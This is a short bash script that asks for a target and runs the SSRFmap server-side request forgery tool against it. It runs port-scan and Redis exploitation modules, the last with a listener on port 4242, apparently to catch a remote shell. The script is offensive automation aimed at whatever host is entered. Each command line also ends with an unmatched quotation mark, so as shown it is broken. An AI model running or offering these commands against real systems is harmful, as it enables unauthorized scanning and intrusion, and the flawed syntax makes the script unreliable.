#!/bin/bash
echo -ne "[+] Entar Target: "
read target
echo -e "[+] Testing all payloads"
cd SSRFmap
python3 ssrfmap.py -r data/request2.txt -p https://$target -m portscan"
python3 ssrfmap.py -r data/request.txt -p https://$target -m redis"
python3 ssrfmap.py -r data/request.txt -p https://$target -m portscan --ssl --uagent 'SSRFmapAgent'"
python3 ssrfmap.py -r data/request.txt -p https://$target -m redis --lhost=127.0.0.1 --lport=4242 -l 4242"
